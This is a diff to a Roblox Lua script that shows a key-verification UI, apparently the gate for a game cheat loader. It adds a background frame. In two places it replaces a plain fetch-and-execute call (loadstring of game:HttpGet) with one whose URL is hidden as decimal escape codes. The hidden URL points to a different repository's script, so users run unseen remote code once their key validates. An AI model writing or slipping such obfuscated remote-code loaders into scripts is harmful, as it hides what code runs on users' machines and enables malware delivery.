@@ -320,6 +320,15 @@ local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "PlatoboostUI"
 screenGui.Parent = PlayerGui
 
+-- 创建半透明背景
+local background = Instance.new("Frame")
+background.Size = UDim2.new(1, 0, 1, 0)
+background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+background.BackgroundTransparency = 0.4
+background.BorderSizePixel = 0
+background.ZIndex = 0
+background.Parent = screenGui
+
 -- 主容器
 local container = Instance.new("Frame")
 container.Size = UDim2.new(0, 350, 0, 400)
@@ -556,8 +565,8 @@ if savedKey then
         if success then
             verifyButton.Text = "验证成功!"
             container.Visible = false
-            background.Visible = false            
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CNHM/asg/refs/heads/main/114514.lua"))()
+            background.Visible = false
+            loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\120\105\97\111\107\111\110\103\54\47\50\56\50\56\53\53\57\56\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\98\98\98\46\108\117\97"))()
         else
             verifyButton.Text = "验证卡密"
             statusLabel.Text = "保存的卡密已失效"
@@ -627,8 +636,8 @@ verifyButton.MouseButton1Click:Connect(function()
             -- 等待2秒后关闭UI并执行脚本
             task.wait(2)
             container.Visible = false
-            background.Visible = false           
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CNHM/asg/refs/heads/main/114514.lua"))()
+            background.Visible = false
+            loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\120\105\97\111\107\111\110\103\54\47\50\56\50\56\53\53\57\56\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\98\98\98\46\108\117\97"))()
         else
             verifyButton.Text = "验证卡密"
             statusLabel.Text = "卡密验证失败"
